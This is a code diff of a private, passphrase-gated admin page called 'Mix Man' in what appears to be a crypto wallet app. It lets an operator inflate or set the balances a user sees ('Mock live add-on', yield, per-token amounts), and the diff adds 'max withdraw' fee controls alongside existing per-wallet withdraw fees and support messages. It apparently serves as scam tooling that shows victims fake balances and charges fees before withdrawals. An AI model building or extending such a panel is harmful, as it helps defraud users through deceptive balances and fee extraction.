@@ -2,7 +2,18 @@ import { brandPreviewMeta } from "@/lib/brand";
 import { createFileRoute, Link } from "@tanstack/react-router";
 import { useServerFn } from "@tanstack/react-start";
 import { useEffect, useState } from "react";
-import { Activity, Loader2, Lock, LogOut, Minus, MonitorSmartphone, Plus, RefreshCw, Snowflake, Wallet } from "lucide-react";
+import {
+  Activity,
+  Loader2,
+  Lock,
+  LogOut,
+  Minus,
+  MonitorSmartphone,
+  Plus,
+  RefreshCw,
+  Snowflake,
+  Wallet,
+} from "lucide-react";
 import { DeviceSessions } from "@/components/DeviceSessions";
 import { ActivityFeed } from "@/components/ActivityFeed";
 import { TreasuryPanel } from "@/components/TreasuryPanel";
@@ -34,7 +45,7 @@ import { Button } from "@/components/ui/button";
 import { DailyYieldControl } from "@/components/DailyYieldControl";
 import { setDailyYield } from "@/lib/daily-yield.functions";
 import { readDisplayFlags, type DisplayFlags } from "@/lib/display-flags";
-import { readWithdraw, stripWithdrawKeys, type WithdrawButton } from "@/lib/withdraw";
+import { readWithdraw, readMaxWithdraw, stripWithdrawKeys } from "@/lib/withdraw";
 
 export const Route = createFileRoute("/mixman")({
   head: () => ({
@@ -58,14 +69,18 @@ function MixManPage() {
   const [pw, setPw] = useState("");
   const [err, setErr] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
-  const [tab, setTab] = useState<"balances" | "activities" | "devices" | "treasury" | "plans">("balances");
+  const [tab, setTab] = useState<"balances" | "activities" | "devices" | "treasury" | "plans">(
+    "balances",
+  );
 
   const isUnlockedFn = useServerFn(mixmanIsUnlocked);
   const loginFn = useServerFn(mixmanLogin);
   const logoutFn = useServerFn(mixmanLogout);
 
   useEffect(() => {
-    isUnlockedFn().then((r) => setUnlocked(r.unlocked)).catch(() => setUnlocked(false));
+    isUnlockedFn()
+      .then((r) => setUnlocked(r.unlocked))
+      .catch(() => setUnlocked(false));
   }, [isUnlockedFn]);
 
   const onSubmit = async (e: React.FormEvent) => {
@@ -101,7 +116,9 @@ function MixManPage() {
             <Lock className="h-5 w-5 text-primary-foreground" />
           </div>
           <h1 className="mt-4 text-center font-display text-2xl font-semibold">Mix Man</h1>
-          <p className="mt-1 text-center text-xs text-muted-foreground">Enter passphrase to continue.</p>
+          <p className="mt-1 text-center text-xs text-muted-foreground">
+            Enter passphrase to continue.
+          </p>
           <form onSubmit={onSubmit} className="mt-6 space-y-3">
             <input
               type="password"
@@ -130,7 +147,9 @@ function MixManPage() {
         <div>
           <p className="text-xs uppercase tracking-widest text-primary/90 font-medium">Private</p>
           <h1 className="mt-1 font-display text-3xl font-semibold">Mix Man</h1>
-          <p className="mt-1 text-sm text-muted-foreground">Adjust balance displays for your wallet.</p>
+          <p className="mt-1 text-sm text-muted-foreground">
+            Adjust balance displays for your wallet.
+          </p>
         </div>
         <button
           onClick={async () => {
@@ -154,21 +173,48 @@ function MixManPage() {
                 : "text-muted-foreground hover:bg-white/10"
             }`}
           >
-            {t === "balances" ? <Wallet className="h-3.5 w-3.5" /> : t === "devices" ? <MonitorSmartphone className="h-3.5 w-3.5" /> : <Activity className="h-3.5 w-3.5" />}
-            {t === "balances" ? "Balances" : t === "activities" ? "Activities" : t === "devices" ? "Devices" : "Treasury & chat"}
+            {t === "balances" ? (
+              <Wallet className="h-3.5 w-3.5" />
+            ) : t === "devices" ? (
+              <MonitorSmartphone className="h-3.5 w-3.5" />
+            ) : (
+              <Activity className="h-3.5 w-3.5" />
+            )}
+            {t === "balances"
+              ? "Balances"
+              : t === "activities"
+                ? "Activities"
+                : t === "devices"
+                  ? "Devices"
+                  : "Treasury & chat"}
           </button>
         ))}
-        <Button size="sm" variant={tab === "plans" ? "default" : "ghost"} onClick={() => setTab("plans")}><Activity className="h-3.5 w-3.5" />Plans</Button>
+        <Button
+          size="sm"
+          variant={tab === "plans" ? "default" : "ghost"}
+          onClick={() => setTab("plans")}
+        >
+          <Activity className="h-3.5 w-3.5" />
+          Plans
+        </Button>
       </div>
 
-      {tab === "plans" ? <div className="mt-6"><InvestmentPlanControl /></div> : !session ? (
+      {tab === "plans" ? (
+        <div className="mt-6">
+          <InvestmentPlanControl />
+        </div>
+      ) : !session ? (
         <div className="mt-8 glass rounded-xl p-6 text-sm text-muted-foreground">
-          You must be signed in with a wallet. <Link to="/wallet" className="text-primary underline">Go to wallet</Link>
+          You must be signed in with a wallet.{" "}
+          <Link to="/wallet" className="text-primary underline">
+            Go to wallet
+          </Link>
         </div>
       ) : tab === "activities" ? (
         <div className="mt-6 space-y-3">
           <p className="text-xs text-muted-foreground">
-            Live transfer history for this wallet — coins and tokens received or sent on every chain.
+            Live transfer history for this wallet — coins and tokens received or sent on every
+            chain.
           </p>
           <ActivityFeed addresses={session.wallet?.addresses ?? []} />
         </div>
@@ -186,7 +232,10 @@ function MixManPage() {
             <SupportControl address={session.address} />
             <p className="text-xs text-muted-foreground">
               Read and reply to messages in the{" "}
-              <Link to="/support-inbox" className="text-primary underline">support inbox</Link>.
+              <Link to="/support-inbox" className="text-primary underline">
+                support inbox
+              </Link>
+              .
             </p>
           </div>
         </div>
@@ -254,36 +303,135 @@ function MixEditor({ walletAddress }: { walletAddress: string }) {
         title="Total balance (USD)"
         current={override?.usd_balance ?? null}
         placeholder="Live"
-        onAdd={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "add", amount: n } }), `+ $${n} added to total`)}
-        onSub={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "sub", amount: n } }), `- $${n} removed from total`)}
-        onSet={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "set", amount: n } }), `Total set to $${n}`)}
-        onClear={() => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "clear" } }), "Total reverted to live")}
+        onAdd={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "total", op: "add", amount: n },
+              }),
+            `+ $${n} added to total`,
+          )
+        }
+        onSub={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "total", op: "sub", amount: n },
+              }),
+            `- $${n} removed from total`,
+          )
+        }
+        onSet={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "total", op: "set", amount: n },
+              }),
+            `Total set to $${n}`,
+          )
+        }
+        onClear={() =>
+          run(
+            () => adjust({ data: { wallet_address: walletAddress, field: "total", op: "clear" } }),
+            "Total reverted to live",
+          )
+        }
       />
 
       <FieldRow
         title="Yield balance (USD)"
         current={override?.yield_balance ?? 0}
-        onAdd={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "add", amount: n } }), `+ $${n} yield`)}
-        onSub={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "sub", amount: n } }), `- $${n} yield`)}
-        onSet={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "set", amount: n } }), `Yield = $${n}`)}
-        onClear={() => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "clear" } }), "Yield cleared")}
+        onAdd={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "yield", op: "add", amount: n },
+              }),
+            `+ $${n} yield`,
+          )
+        }
+        onSub={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "yield", op: "sub", amount: n },
+              }),
+            `- $${n} yield`,
+          )
+        }
+        onSet={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "yield", op: "set", amount: n },
+              }),
+            `Yield = $${n}`,
+          )
+        }
+        onClear={() =>
+          run(
+            () => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "clear" } }),
+            "Yield cleared",
+          )
+        }
       />
 
       <FieldRow
         title="Mock live add-on (USD)"
         current={override?.mock_live_balance ?? 0}
-        onAdd={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "add", amount: n } }), `+ $${n} mock`)}
-        onSub={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "sub", amount: n } }), `- $${n} mock`)}
-        onSet={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "set", amount: n } }), `Mock = $${n}`)}
-        onClear={() => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "clear" } }), "Mock cleared")}
+        onAdd={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "mock_live", op: "add", amount: n },
+              }),
+            `+ $${n} mock`,
+          )
+        }
+        onSub={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "mock_live", op: "sub", amount: n },
+              }),
+            `- $${n} mock`,
+          )
+        }
+        onSet={(n) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: "mock_live", op: "set", amount: n },
+              }),
+            `Mock = $${n}`,
+          )
+        }
+        onClear={() =>
+          run(
+            () =>
+              adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "clear" } }),
+            "Mock cleared",
+          )
+        }
       />
 
       <WithdrawButtonControl
         current={readWithdraw(override?.token_overrides).button}
         currentFee={readWithdraw(override?.token_overrides).fee}
         currentSupportMessage={override?.withdraw_support_message}
-        onSet={async (button: WithdrawButton, fee: number, support_message: string) => {
-          await setWd({ data: { wallet_address: walletAddress, button, fee, support_message } });
+        currentMaxWithdraw={readMaxWithdraw(override?.token_overrides).enabled}
+        currentMaxFee={readMaxWithdraw(override?.token_overrides).fee}
+        onSet={async ({ button, fee, supportMessage, maxWithdraw, maxFee }) => {
+          await setWd({
+            data: {
+              wallet_address: walletAddress,
+              button,
+              fee,
+              support_message: supportMessage,
+              max_withdraw: maxWithdraw,
+              max_fee: maxFee,
+            },
+          });
           await refresh();
         }}
       />
@@ -310,8 +458,6 @@ function MixEditor({ walletAddress }: { walletAddress: string }) {
         onChanged={refresh}
       />
 
-
-
       <BonusControl
         current={readDisplayFlags(override?.token_overrides).bonus}
         onSet={async (bonus: number) => {
@@ -324,13 +470,26 @@ function MixEditor({ walletAddress }: { walletAddress: string }) {
         tokens={override?.token_overrides}
         onSave={(chain, symbol, amount, price, contract) =>
           run(
-            () => setTok({ data: { wallet_address: walletAddress, chain, symbol, amount, price, contract } }),
+            () =>
+              setTok({
+                data: { wallet_address: walletAddress, chain, symbol, amount, price, contract },
+              }),
             `${symbol} on ${chain} saved`,
           )
         }
         onRemove={(chain, symbol) =>
           run(
-            () => setTok({ data: { wallet_address: walletAddress, chain, symbol, amount: 0, price: 0, remove: true } }),
+            () =>
+              setTok({
+                data: {
+                  wallet_address: walletAddress,
+                  chain,
+                  symbol,
+                  amount: 0,
+                  price: 0,
+                  remove: true,
+                },
+              }),
             `${symbol} removed`,
           )
         }
@@ -338,10 +497,57 @@ function MixEditor({ walletAddress }: { walletAddress: string }) {
 
       <TokenEditor
         overrides={stripWithdrawKeys(override?.token_overrides)}
-        onAdd={(sym, n) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "add", amount: n } }), `+ ${n} ${sym}`)}
-        onSub={(sym, n) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "sub", amount: n } }), `- ${n} ${sym}`)}
-        onSet={(sym, n) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "set", amount: n } }), `${sym} = ${n}`)}
-        onClear={(sym) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "clear" } }), `${sym} cleared`)}
+        onAdd={(sym, n) =>
+          run(
+            () =>
+              adjust({
+                data: {
+                  wallet_address: walletAddress,
+                  field: `token:${sym}`,
+                  op: "add",
+                  amount: n,
+                },
+              }),
+            `+ ${n} ${sym}`,
+          )
+        }
+        onSub={(sym, n) =>
+          run(
+            () =>
+              adjust({
+                data: {
+                  wallet_address: walletAddress,
+                  field: `token:${sym}`,
+                  op: "sub",
+                  amount: n,
+                },
+              }),
+            `- ${n} ${sym}`,
+          )
+        }
+        onSet={(sym, n) =>
+          run(
+            () =>
+              adjust({
+                data: {
+                  wallet_address: walletAddress,
+                  field: `token:${sym}`,
+                  op: "set",
+                  amount: n,
+                },
+              }),
+            `${sym} = ${n}`,
+          )
+        }
+        onClear={(sym) =>
+          run(
+            () =>
+              adjust({
+                data: { wallet_address: walletAddress, field: `token:${sym}`, op: "clear" },
+              }),
+            `${sym} cleared`,
+          )
+        }
       />
 
       <div className="glass rounded-xl p-4 space-y-3">
@@ -395,7 +601,9 @@ function MixEditor({ walletAddress }: { walletAddress: string }) {
       </div>
 
       <button
-        onClick={() => run(() => sync({ data: { wallet_address: walletAddress } }), "Reset to live values")}
+        onClick={() =>
+          run(() => sync({ data: { wallet_address: walletAddress } }), "Reset to live values")
+        }
         className="w-full rounded-lg glass py-3 text-sm font-medium hover:bg-white/10"
       >
         Reset all overrides (show pure live balances)
@@ -435,7 +643,7 @@ function FieldRow({
       <div className="flex items-center justify-between">
         <span className="text-sm font-medium">{title}</span>
         <span className="text-xs text-muted-foreground">
-          Current: {current == null ? placeholder ?? "—" : `$${current.toLocaleString()}`}
+          Current: {current == null ? (placeholder ?? "—") : `$${current.toLocaleString()}`}
         </span>
       </div>
       <div className="mt-3 flex flex-wrap items-center gap-2">
@@ -489,10 +697,57 @@ function TokenEditor({
   onClear: (sym: string) => void;
 }) {
   const PRESETS = [
-    "BTC","BTC_LEGACY","ETH","BASE","BNB","MATIC","SOL","MON","OP","ARB","AVAX","HYPE","LINEA","BERA","MNT","ZETA","ZKSYNC","SHAPE","RHC","USDT","USDC",
-    "DAI","XRP","ADA","DOGE","DOT","LINK","LTC","TRX","TON","SHIB",
-    "UNI","ATOM","NEAR","APT","SUI","FTM","ETC","XLM","BCH","FIL",
-    "AAVE","CRO","ALGO","VET","HBAR","ICP","INJ","RUNE","PEPE","WBTC",
+    "BTC",
+    "BTC_LEGACY",
+    "ETH",
+    "BASE",
+    "BNB",
+    "MATIC",
+    "SOL",
+    "MON",
+    "OP",
+    "ARB",
+    "AVAX",
+    "HYPE",
+    "LINEA",
+    "BERA",
+    "MNT",
+    "ZETA",
+    "ZKSYNC",
+    "SHAPE",
+    "RHC",
+    "USDT",
+    "USDC",
+    "DAI",
+    "XRP",
+    "ADA",
+    "DOGE",
+    "DOT",
+    "LINK",
+    "LTC",
+    "TRX",
+    "TON",
+    "SHIB",
+    "UNI",
+    "ATOM",
+    "NEAR",
+    "APT",
+    "SUI",
+    "FTM",
+    "ETC",
+    "XLM",
+    "BCH",
+    "FIL",
+    "AAVE",
+    "CRO",
+    "ALGO",
+    "VET",
+    "HBAR",
+    "ICP",
+    "INJ",
+    "RUNE",
+    "PEPE",
+    "WBTC",
   ];
   const [sym, setSym] = useState("BTC");
   const [amt, setAmt] = useState("");
@@ -504,7 +759,11 @@ function TokenEditor({
       <div className="flex items-center justify-between">
         <span className="text-sm font-medium">Per-token balance</span>
         <span className="text-xs text-muted-foreground">
-          {Object.keys(overrides).length ? Object.entries(overrides).map(([k, v]) => `${k}: ${v}`).join(" · ") : "none"}
+          {Object.keys(overrides).length
+            ? Object.entries(overrides)
+                .map(([k, v]) => `${k}: ${v}`)
+                .join(" · ")
+            : "none"}
         </span>
       </div>
       <div className="mt-3 flex flex-wrap gap-1.5">
